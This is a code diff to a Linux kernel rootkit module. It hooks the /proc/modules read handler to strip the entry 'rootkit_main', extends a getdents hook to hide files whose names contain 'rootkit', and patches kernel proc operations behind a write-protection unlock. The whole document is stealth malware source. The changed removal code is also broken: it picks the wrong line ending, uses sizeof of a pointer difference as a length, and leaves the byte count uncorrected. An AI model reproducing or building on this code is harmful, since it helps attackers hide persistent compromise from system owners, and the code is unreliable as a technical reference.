@@ -15,16 +15,19 @@ struct linux_dirent {
 ssize_t seq_read_fake(struct file *file, char __user *buf, size_t size, loff_t *ppos) 
 {
 	char *p;
-	ssize_t rval = orig_proc_read(file, buf, size, ppos);
-	printk("Ret val: %ld\n", rval);
+	char *eol;
+	ssize_t ret = orig_proc_read(file, buf, size, ppos);
+	if((eol = strchr(buf, '\n')) == NULL) {
+		printk(KERN_ALERT "COULD NOT FIND EOL\n");
+		return ret;
+	}
 	if ((p=strstr(buf, "rootkit_main")) != NULL) {
 		printk("Found rootkit in buffer...Removing:)\n");
 		//delete rootkit name from entries
-		memmove(p,p + strlen("rootkit_main"), strlen(p + strlen("rootkit_main")) + 1);
-		printk("Buf Val: %s\n", buf);
-		return rval - strlen("rootkit_main");
+		memmove(p, eol + 1, sizeof(buf - eol));
+		return ret;// - (strlen(p + strlen("rootkit_main")) + 1); //ret bytes read 
 	}
-	return rval;
+	return ret;
 }
 
 //Test fakeRead
@@ -36,7 +39,8 @@ static asmlinkage int fakegetdents(int fd, struct linux_dirent __user *dirp, uns
 	ret = orig_getdents(fd, dirp, count);
 
 	while(i < ret) {
-		if(strncmp(cur->d_name, DEVICE_NAME, strlen(DEVICE_NAME)) == 0) {
+		if(strncmp(cur->d_name, DEVICE_NAME, strlen(DEVICE_NAME)) == 0 ||
+			strstr(cur->d_name, "rootkit") != NULL) {
 			int reclen = cur->d_reclen; //len of dirent
 			char *next_rec = (char *)cur + reclen; //next dir rec
 			int len = (int)dirp + ret - (int)next_rec; //cast to int for +
@@ -274,7 +278,7 @@ static ssize_t device_write(struct file *filp,
 
 			//save old proc_modules_operations->read
 			orig_proc_read = (typeof(seq_read) *) proc_ops->read;
-			//replace read with own version
+			//replace seq_read with own version
 			CRO_WRITE_UNLOCK({ proc_ops->read = (void *)&seq_read_fake; });
 			break;
 			}
